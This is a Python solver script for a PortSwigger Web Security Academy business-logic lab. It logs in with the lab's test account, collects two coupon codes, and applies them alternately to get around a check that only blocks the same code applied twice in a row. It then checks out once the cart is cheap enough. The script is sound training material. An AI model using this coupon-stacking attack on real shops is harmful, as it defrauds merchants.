#!/usr/bin/env python3
"""
Flawed enforcement of business rules
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 04-flawed-enforcement-of-business-rules.md

What this does:
    Logs in as wiener:peter, reads the NEWCUST5 coupon off the homepage,
    signs up for the newsletter to unlock the SIGNUP30 coupon, adds the
    leather jacket to the cart, then alternates the two coupon codes --
    the dedup check only rejects applying the *same* code twice in a row,
    not a code that has ever been used before, so alternating bypasses it
    every time and each application discounts the cart further. Stops once
    the total is affordable and checks out.

Usage:
    python 04-flawed-enforcement-of-business-rules.py <lab-url>
    e.g. python 04-flawed-enforcement-of-business-rules.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str, username: str, password: str) -> None:
    csrf = _get_csrf(client, f"{base}/login")
    client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)
    _login(c, lab_url, "wiener", "peter")

    home_r = c.get(f"{lab_url}/")
    coupon1_m = re.search(r'([A-Z][A-Z0-9]{3,})', home_r.text)
    coupon1 = coupon1_m.group(1) if coupon1_m else "NEWCUST5"

    csrf = _get_csrf(c, f"{lab_url}/")
    signup_r = c.post(f"{lab_url}/sign-up", data={"csrf": csrf, "email": "test@test.com"})
    coupon2_m = re.search(r'([A-Z][A-Z0-9]{3,})', signup_r.text)
    coupon2 = coupon2_m.group(1) if coupon2_m else "SIGNUP30"

    if coupon1 == coupon2:
        coupon1, coupon2 = "NEWCUST5", "SIGNUP30"
    coupons = [coupon1, coupon2]
    print(f"[*] Coupons in play: {coupons}")

    csrf = _get_csrf(c, f"{lab_url}/cart")
    c.post(f"{lab_url}/cart", data={
        "csrf": csrf, "productId": "1",
        "quantity": "1", "redir": "PRODUCT"
    })
    print("[*] Added jacket to cart")

    for i in range(50):
        coupon = coupons[i % 2]
        csrf = _get_csrf(c, f"{lab_url}/cart")
        c.post(f"{lab_url}/cart/coupon", data={"csrf": csrf, "coupon": coupon})

        cart_r = c.get(f"{lab_url}/cart")
        totals = re.findall(r'\$(\d+\.\d+)', cart_r.text)
        if totals:
            total = float(totals[-1])
            if (i + 1) % 10 == 0:
                print(f"[*] After {i+1} alternating applications, total ${total:.2f}")
            if 0 < total <= 100:
                print(f"[*] Total ${total:.2f} inside store credit after {i+1} applications")
                break

    csrf = _get_csrf(c, f"{lab_url}/cart")
    c.post(f"{lab_url}/cart/checkout", data={"csrf": csrf})

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- coupon alternation bypassed the dedup check.")
    else:
        print("[-] Not solved yet -- may need more alternating applications.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
